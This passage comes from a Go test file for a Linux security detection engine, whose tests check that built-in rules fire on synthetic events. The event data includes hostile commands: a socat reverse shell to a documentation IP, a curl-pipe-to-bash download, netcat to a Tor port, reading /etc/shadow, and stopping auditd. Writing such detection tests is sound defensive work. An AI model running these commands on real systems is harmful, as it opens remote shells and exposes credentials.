	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.long_lived_public_remote_admin_session" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinLongLivedProxyTorSessionRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkClose,
		Source:    "ebpf",
		Timestamp: time.Unix(1712607000, 0).UTC(),
		Tags:      []string{"network", "linux", "close"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "bash",
			Image:      "/bin/bash",
			Command:    "/bin/bash -lc nc 203.0.113.30 9050",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:        "tcp",
			DestAddress:     "203.0.113.30",
			DestPort:        9050,
			SourceAddress:   "10.10.10.5",
			SourcePort:      49152,
			ConnectionState: "closed",
		},
		Data: map[string]any{
			"connection_age_seconds":    int64(600),
			"previous_connection_state": "ESTABLISHED",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.long_lived_proxy_tor_session" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinFileRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.file.integrity"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeFileChange,
		Source:    "filewatch",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"file", "linux"},
		File: &model.File{
			Path:      "/var/lib/container/merged/etc/passwd",
			Operation: "WRITE",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.file.sensitive_path_change" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}

	if alert.Detail["builtin_rule_set"] != "linux.file.integrity" {
		t.Fatalf("unexpected builtin rule set detail: %#v", alert.Detail["builtin_rule_set"])
	}
}

func TestEngineEvaluateMatchesBuiltinWritableTmpELFDropRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.file.integrity"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeFileChange,
		Source:    "filewatch",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"file", "linux", "tmp"},
		File: &model.File{
			Path:      "/tmp/payload",
			Operation: "CREATE",
			Artifact: &model.Artifact{
				Path:     "/tmp/payload",
				Exists:   true,
				FileType: "elf",
				Magic:    "7f454c46",
				Hashes:   &model.ArtifactHashes{SHA256: "abc", MD5: "def"},
				ELF:      &model.ELFArtifact{Machine: "EM_X86_64", EntryAddress: "0x401000"},
			},
		},
	})

	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.file.writable_tmp_elf_drop" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	artifactDetail, ok := alerts[0].Detail["artifact"].(map[string]any)
	if !ok {
		t.Fatalf("expected artifact detail map, got %#v", alerts[0].Detail["artifact"])
	}
	if artifactDetail["file_type"] != "elf" {
		t.Fatalf("unexpected artifact file type: %#v", artifactDetail["file_type"])
	}
}

func TestEngineEvaluateMatchesBuiltinSensitivePathChangeForLoaderPersistencePath(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.file.integrity"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeFileChange,
		Source:    "filewatch",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"file", "linux", "integrity"},
		File: &model.File{
			Path:      "/srv/rootfs/etc/ld.so.preload",
			Operation: "WRITE",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.file.sensitive_path_change" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinSystemELFChangeRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.file.integrity"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeFileChange,
		Source:    "filewatch",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"file", "linux", "integrity"},
		File: &model.File{
			Path:      "/usr/bin/ssh",
			Operation: "WRITE",
			Artifact: &model.Artifact{
				Path:     "/usr/bin/ssh",
				Exists:   true,
				FileType: "elf",
				Magic:    "7f454c46",
				Hashes:   &model.ArtifactHashes{SHA256: "123", MD5: "456"},
				ELF:      &model.ELFArtifact{Machine: "EM_X86_64", EntryAddress: "0x402000"},
			},
		},
	})

	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.file.system_elf_change" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	eventDetail, ok := alerts[0].Detail["event"].(map[string]any)
	if !ok {
		t.Fatalf("expected event detail map, got %#v", alerts[0].Detail["event"])
	}
	fileDetail, ok := eventDetail["file"].(map[string]any)
	if !ok {
		t.Fatalf("expected file detail map, got %#v", eventDetail["file"])
	}
	if _, ok := fileDetail["artifact"].(map[string]any); !ok {
		t.Fatalf("expected file artifact snapshot, got %#v", fileDetail["artifact"])
	}
}

func TestEngineEvaluateMatchesBuiltinSensitiveOwnershipDriftRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.file.integrity"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "file", "integrity"},
		File: &model.File{
			Path:      "/etc/shadow",
			Operation: "chown",
		},
		Audit: &model.Audit{
			Family:            "file",
			Action:            "chown",
			FileUID:           "0",
			FileGID:           "42",
			FileOwner:         "root",
			FileGroup:         "shadow",
			PreviousFileUID:   "0",
			PreviousFileGID:   "0",
			PreviousFileOwner: "root",
			PreviousFileGroup: "root",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.file.sensitive_owner_group_drift" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
	if alert.Detail["drift_type"] != "ownership" {
		t.Fatalf("unexpected drift type: %#v", alert.Detail["drift_type"])
	}
	if alert.Detail["summary"] != "owner/group root/root -> root/shadow · uid/gid 0:0 -> 0:42" {
		t.Fatalf("unexpected summary: %#v", alert.Detail["summary"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditRemoteLoginFailedRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "login", "fail"},
		Audit: &model.Audit{
			Family:    "login",
			Result:    "fail",
			Username:  "root",
			LoginUser: "root",
			RemoteIP:  "10.0.0.5",
			Terminal:  "ssh",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.audit.remote_login_failed" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "medium" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
	if alert.Detail["remote_ip"] != "10.0.0.5" {
		t.Fatalf("unexpected remote ip: %#v", alert.Detail["remote_ip"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditRemoteRootLoginSuccessRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "login", "success"},
		Audit: &model.Audit{
			Family:    "login",
			Result:    "success",
			Username:  "root",
			LoginUser: "root",
			RemoteIP:  "10.0.0.8",
			Terminal:  "ssh",
			SessionID: "42",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.audit.remote_root_login_success" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
	if alert.Detail["session_id"] != "42" {
		t.Fatalf("unexpected session id: %#v", alert.Detail["session_id"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditSecurityControlTamperRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "command"},
		Process: &model.Process{
			Image:   "/usr/bin/systemctl",
			Command: "systemctl stop auditd",
		},
		Audit: &model.Audit{
			Family:   "command",
			Result:   "success",
			Username: "root",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.audit.security_control_tamper_command" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
	if alert.Detail["command"] != "systemctl stop auditd" {
		t.Fatalf("unexpected command: %#v", alert.Detail["command"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditDownloadPipeShellRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "command"},
		Process: &model.Process{
			Image:   "/bin/sh",
			Command: "sh -c curl -fsSL https://example.test/install.sh | bash",
		},
		Audit: &model.Audit{
			Family:    "command",
			Result:    "success",
			Username:  "root",
			SessionID: "9",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.audit.download_pipe_shell_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Detail["session_id"] != "9" {
		t.Fatalf("unexpected session id: %#v", alerts[0].Detail["session_id"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditSetuidSetgidBitRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "command"},
		Process: &model.Process{
			Image:   "/usr/bin/chmod",
			Command: "chmod 4755 /tmp/helper",
		},
		Audit: &model.Audit{
			Family:   "command",
			Result:   "success",
			Username: "root",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.audit.setuid_setgid_bit_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinAuditReverseShellCommandRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "command"},
		Process: &model.Process{
			Image:   "/usr/bin/socat",
			Command: "socat tcp:203.0.113.10:4444 exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane",
		},
		Audit: &model.Audit{
			Family:    "command",
			Result:    "success",
			Username:  "root",
			SessionID: "11",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.audit.reverse_shell_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Severity != "critical" {
		t.Fatalf("unexpected severity: %s", alerts[0].Severity)
	}
	if alerts[0].Detail["session_id"] != "11" {
		t.Fatalf("unexpected session id: %#v", alerts[0].Detail["session_id"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditPersistenceCommandRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "command"},
		Process: &model.Process{
			Image:   "/usr/bin/systemctl",
			Command: "systemctl enable evil.service",
		},
		Audit: &model.Audit{
			Family:   "command",
			Result:   "success",
			Username: "root",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.audit.persistence_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinAuditAccountManagementCommandRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "command"},
		Process: &model.Process{
			Image:   "/usr/sbin/usermod",
			Command: "usermod -aG sudo deploy",
		},
		Audit: &model.Audit{
			Family:    "command",
			Result:    "success",
			Username:  "root",
			LoginUser: "alice",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.audit.account_management_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Detail["login_user"] != "alice" {
		t.Fatalf("unexpected login user: %#v", alerts[0].Detail["login_user"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditSensitiveFileAccessRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "file"},
		Process: &model.Process{
			Image:   "/usr/bin/cat",
			Command: "cat /etc/shadow",
		},
		File: &model.File{
			Path:      "/etc/shadow",
			Operation: "open",
		},
		Audit: &model.Audit{
			Family:     "file",
			Result:     "success",
			Action:     "open",
			Username:   "root",
			ProcessCWD: "/root",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.audit.sensitive_file_access" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Detail["path"] != "/etc/shadow" {
		t.Fatalf("unexpected path: %#v", alert.Detail["path"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditSensitiveFileMutationRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "file"},
		Process: &model.Process{
			Image:   "/usr/bin/vim",
			Command: "vim /etc/shadow",
		},
		File: &model.File{
			Path:      "/etc/shadow",
			Operation: "write",
		},
		Audit: &model.Audit{
			Family:     "file",
			Result:     "success",
			Action:     "write",
			Username:   "root",
			ProcessCWD: "/root",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.audit.sensitive_file_mutation" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Detail["command"] != "vim /etc/shadow" {
		t.Fatalf("unexpected command: %#v", alert.Detail["command"])
	}
}

func TestEngineEvaluateMatchesBuiltinAuditPrivilegeChangeRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.audit.core"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "privilege"},
		Audit: &model.Audit{
			Family:          "privilege",
			Result:          "success",
			Username:        "root",
			Action:          "add-user",
			ObjectType:      "account",
			ObjectPrimary:   "deploy",
			ObjectSecondary: "wheel",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.audit.privilege_change" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Detail["object_primary"] != "deploy" {
		t.Fatalf("unexpected object primary: %#v", alert.Detail["object_primary"])
	}
}

func TestEngineEvaluateSkipsMismatchedEventType(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-file-only",
				Enabled:        true,
				MatchEventType: model.EventTypeFileChange,
				Severity:       "medium",
				Condition:      "event.type == 'file.change'",
			},
		},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{Type: "process.exec"})
	if len(alerts) != 0 {
		t.Fatalf("expected no alerts, got %d", len(alerts))
	}
}

func TestEngineEvaluateMatchesTemporaryAuditRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-audit-login-fail",
				Enabled:        true,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Condition: "audit.family == 'login' && audit.result == 'fail' && " +
					"audit.remote_ip == '10.0.0.5' && audit.username == 'root'",
				Tags: []string{"audit", "login"},
			},
		},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeAudit,
		Source:    "auditd",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"audit", "login", "fail"},
		Audit: &model.Audit{
			Sequence:    42,
			RecordTypes: []string{"USER_LOGIN"},
			Family:      "login",
			Category:    "user-login",
			RecordType:  "USER_LOGIN",
			Result:      "fail",
			Username:    "root",
			LoginUser:   "root",
			RemoteIP:    "10.0.0.5",
			Terminal:    "pts/0",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "tmp-audit-login-fail" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}

	eventDetail, ok := alert.Detail["event"].(map[string]any)
	if !ok {
		t.Fatalf("expected event detail map, got %#v", alert.Detail["event"])
	}
	auditDetail, ok := eventDetail["audit"].(map[string]any)
	if !ok {
		t.Fatalf("expected audit detail map, got %#v", eventDetail["audit"])
	}
	if auditDetail["family"] != "login" {
		t.Fatalf("unexpected audit family: %#v", auditDetail["family"])
	}
	if auditDetail["result"] != "fail" {
		t.Fatalf("unexpected audit result: %#v", auditDetail["result"])
	}
	if auditDetail["remote_ip"] != "10.0.0.5" {
		t.Fatalf("unexpected audit remote_ip: %#v", auditDetail["remote_ip"])
	}
}

func containsString(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}
